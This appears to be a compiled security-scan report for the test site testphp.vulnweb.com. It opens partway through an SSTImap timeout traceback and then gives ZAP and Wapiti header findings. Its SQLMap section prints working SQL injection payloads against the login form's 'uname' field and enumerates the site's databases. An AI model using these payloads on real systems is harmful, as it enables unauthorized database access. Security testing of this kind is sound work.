               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\Lib\socket.py", line 706, in readinto
    return self._sock.recv_into(b)
           ^^^^^^^^^^^^^^^^^^^^^^^
TimeoutError: [WinError 10060] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\requests\adapters.py", line 667, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\connectionpool.py", line 841, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\util\retry.py", line 474, in increment
    raise reraise(type(error), error, _stacktrace)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\util\util.py", line 39, in reraise
    raise value
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\connectionpool.py", line 787, in urlopen
    response = self._make_request(
               ^^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\connectionpool.py", line 536, in _make_request
    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\connectionpool.py", line 367, in _raise_timeout
    raise ReadTimeoutError(
urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Read timed out. (read timeout=None)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "D:\Web_Sec_Tool\SSTImap\sstimap.py", line 74, in <module>
    raise e
  File "D:\Web_Sec_Tool\SSTImap\sstimap.py", line 67, in <module>
    main()
  File "D:\Web_Sec_Tool\SSTImap\sstimap.py", line 43, in main
    checks.scan_website(args)
  File "D:\Web_Sec_Tool\SSTImap\core\checks.py", line 316, in scan_website
    result = check_template_injection(channel)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\Web_Sec_Tool\SSTImap\core\checks.py", line 90, in check_template_injection
    current_plugin = detect_template_injection(channel)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\Web_Sec_Tool\SSTImap\core\checks.py", line 83, in detect_template_injection
    current_plugin.detect()
  File "D:\Web_Sec_Tool\SSTImap\core\plugin.py", line 143, in detect
    self._detect_render()
  File "D:\Web_Sec_Tool\SSTImap\core\plugin.py", line 294, in _detect_render
    if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\Web_Sec_Tool\SSTImap\core\plugin.py", line 398, in render
    result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix, blind=blind, wrapper="{code}")
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\Web_Sec_Tool\SSTImap\core\plugin.py", line 330, in inject
    result = self.channel.req(injection)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\Web_Sec_Tool\SSTImap\core\channel.py", line 193, in req
    result = requests.request(method=self.http_method, url=url_params, params=get_params, data=post_params,
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\requests\api.py", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\requests\sessions.py", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\requests\sessions.py", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\requests\adapters.py", line 713, in send
    raise ReadTimeout(e, request=request)
requests.exceptions.ReadTimeout: HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Read timed out. (read timeout=None)
```
---
# ZAP Scan Results
**Risk:** Medium
**Name:** Missing Anti-clickjacking Header
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.
**Solution:** Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.
If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
---
**Risk:** Informational
**Name:** Charset Mismatch (Header Versus Meta Content-Type Charset)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.

An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.
**Solution:** Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.
**Reference:** https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection
---
**Risk:** Medium
**Name:** Content Security Policy (CSP) Header Not Set
**URL:** http://testphp.vulnweb.com/login.php
**Description:** Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://www.w3.org/TR/CSP/
https://w3c.github.io/webappsec-csp/
https://web.dev/articles/csp
https://caniuse.com/#feat=contentsecuritypolicy
https://content-security-policy.com/
---
**Risk:** Low
**Name:** Server Leaks Version Information via "Server" HTTP Response Header Field
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.
**Reference:** https://httpd.apache.org/docs/current/mod/core.html#servertokens
https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
https://www.troyhunt.com/shhh-dont-let-your-response-headers/
---
**Risk:** Low
**Name:** X-Content-Type-Options Header Missing
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
**Solution:** Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
**Reference:** https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)
https://owasp.org/www-community/Security_Headers
---
**Risk:** Low
**Name:** Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress "X-Powered-By" headers.
**Reference:** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework
https://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html
---
# Wapiti Scan Results
## Clickjacking Protection
**Path:** /login.php
**Method:** GET
**Info:** X-Frame-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---
## MIME Type Confusion
**Path:** /login.php
**Method:** GET
**Info:** X-Content-Type-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---

# SQLMap Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.2#pip}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:21:35 /2025-02-23/

[23:21:35] [INFO] testing connection to the target URL
[23:21:35] [INFO] searching for forms
[23:21:36] [INFO] found a total of 2 targets
[1/2] Form:
POST http://testphp.vulnweb.com/userinfo.php
POST data: uname=&pass=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: uname=&pass=] (Warning: blank fields detected): uname=&pass=
do you want to fill blank fields with random values? [Y/n] Y
[23:21:36] [INFO] resuming back-end DBMS 'mysql' 
[23:21:36] [INFO] using 'C:\Users\suriya\AppData\Local\sqlmap\output\results-02232025_1121pm.csv' as the CSV results file in multiple targets mode
got a 302 redirect to 'http://testphp.vulnweb.com/login.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uname=zCfm' OR NOT 7165=7165#&pass=oJiM

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: uname=zCfm' AND GTID_SUBSET(CONCAT(0x7171626a71,(SELECT (ELT(9122=9122,1))),0x71767a7671),9122)-- kxRG&pass=oJiM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=zCfm' AND (SELECT 6864 FROM (SELECT(SLEEP(5)))JxpO)-- UtIo&pass=oJiM

    Type: UNION query
    Title: MySQL UNION query (NULL) - 8 columns
    Payload: uname=zCfm' UNION ALL SELECT NULL,CONCAT(0x7171626a71,0x6c4b4849616a4d64637a4b6279536b6153756c4b484450454a7a5972547177714b6263566c444261,0x71767a7671),NULL,NULL,NULL,NULL,NULL,NULL#&pass=oJiM
---
do you want to exploit this SQL injection? [Y/n] Y
[23:21:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
[23:21:37] [INFO] fetching database names
[23:21:37] [INFO] resumed: 'information_schema'
[23:21:37] [INFO] resumed: 'acuart'
available databases [2]:
[*] acuart
[*] information_schema

SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
[23:21:37] [INFO] skipping 'http://testphp.vulnweb.com/search.php?test=query'
[23:21:37] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\suriya\AppData\Local\sqlmap\output\results-02232025_1121pm.csv'

[*] ending @ 23:21:37 /2025-02-23/

```
---

# XSStrike Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
[91m
	XSStrike [97mv3.1.5
[0m
[97m[~][0m Checking for DOM vulnerabilities [0m
[91m[-][0m No parameters to test. [0m
```
---

# Commix Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.1-dev#12
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright � 2014-2025 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[23:21:39] [info] Testing connection to the target URL. 
[23:21:41] [info] Checking if the target is protected by some kind of WAF/IPS.
[23:21:42] [info] Performing identification (passive) tests to the target URL.
[23:21:42] [critical] No parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'.
```
---
